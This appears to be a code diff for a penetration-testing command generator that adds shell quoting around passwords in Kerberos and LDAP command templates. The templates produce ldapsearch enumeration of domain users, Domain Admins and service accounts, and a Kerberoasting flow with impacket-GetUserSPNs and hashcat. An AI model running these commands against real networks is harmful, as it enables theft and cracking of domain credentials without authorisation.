@@ -1,5 +1,5 @@
 import type { Tool } from '../../types';
-import { v } from '../../lib/auth';
+import { q, v } from '../../lib/auth';
 
 export const kerberosTools: Tool[] = [
   {
@@ -20,7 +20,7 @@ export const kerberosTools: Tool[] = [
           let auth = '';
           switch (p.authMode) {
             case 'password':
-              auth = `-p ${v(p.password, 'PASSWORD')}`;
+              auth = `-p ${q(v(p.password, 'PASSWORD'))}`;
               break;
             case 'hash':
               auth = `--hashes :${v(p.ntHash, 'NTHASH')}`;
@@ -88,7 +88,7 @@ export const kerberosTools: Tool[] = [
           const dcFQDN = v(p.dcFQDN || p.dcIP, 'DC');
           const domain = v(p.domain, 'DOMAIN');
           const user = v(p.username, 'USER');
-          const password = v(p.password, 'PASSWORD');
+          const password = q(v(p.password, 'PASSWORD'));
           const baseDN = domain.split('.').map(s => `dc=${s}`).join(',');
 
           return `ldapsearch -x -H ldap://${dcFQDN} -D "${user}@${domain}" -w ${password} -b "${baseDN}" "(objectClass=user)"`;
@@ -101,7 +101,7 @@ export const kerberosTools: Tool[] = [
           const dcFQDN = v(p.dcFQDN || p.dcIP, 'DC');
           const domain = v(p.domain, 'DOMAIN');
           const user = v(p.username, 'USER');
-          const password = v(p.password, 'PASSWORD');
+          const password = q(v(p.password, 'PASSWORD'));
           const baseDN = domain.split('.').map(s => `dc=${s}`).join(',');
 
           return `ldapsearch -x -H ldap://${dcFQDN} -D "${user}@${domain}" -w ${password} -b "${baseDN}" "(memberOf=CN=Domain Admins,CN=Users,${baseDN})"`;
@@ -114,7 +114,7 @@ export const kerberosTools: Tool[] = [
           const dcFQDN = v(p.dcFQDN || p.dcIP, 'DC');
           const domain = v(p.domain, 'DOMAIN');
           const user = v(p.username, 'USER');
-          const password = v(p.password, 'PASSWORD');
+          const password = q(v(p.password, 'PASSWORD'));
           const baseDN = domain.split('.').map(s => `dc=${s}`).join(',');
 
           return `ldapsearch -x -H ldap://${dcFQDN} -D "${user}@${domain}" -w ${password} -b "${baseDN}" "(&(servicePrincipalName=*)(objectCategory=user))"`;
@@ -161,7 +161,7 @@ export const kerberosTools: Tool[] = [
         id: 'kerberoast-flow',
         title: 'Kerberoasting 完整流程',
         description: '1. 枚举 SPN -> 2. 请求 TGS -> 3. 离线破解',
-        build: (p) => `# 1. 枚举 SPN\nimpacket-GetUserSPNs ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}:${v(p.password, 'PASSWORD')} -dc-ip ${v(p.dcIP, 'DC_IP')}\n\n# 2. 请求票据\nimpacket-GetUserSPNs ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}:${v(p.password, 'PASSWORD')} -dc-ip ${v(p.dcIP, 'DC_IP')} -request -outputfile hashes.txt\n\n# 3. hashcat 破解\nhashcat -m 13100 hashes.txt wordlist.txt`,
+        build: (p) => `# 1. 枚举 SPN\nimpacket-GetUserSPNs ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}:${q(v(p.password, 'PASSWORD'))} -dc-ip ${v(p.dcIP, 'DC_IP')}\n\n# 2. 请求票据\nimpacket-GetUserSPNs ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}:${q(v(p.password, 'PASSWORD'))} -dc-ip ${v(p.dcIP, 'DC_IP')} -request -outputfile hashes.txt\n\n# 3. hashcat 破解\nhashcat -m 13100 hashes.txt wordlist.txt`,
       },
       {
         id: 'asrep-flow',
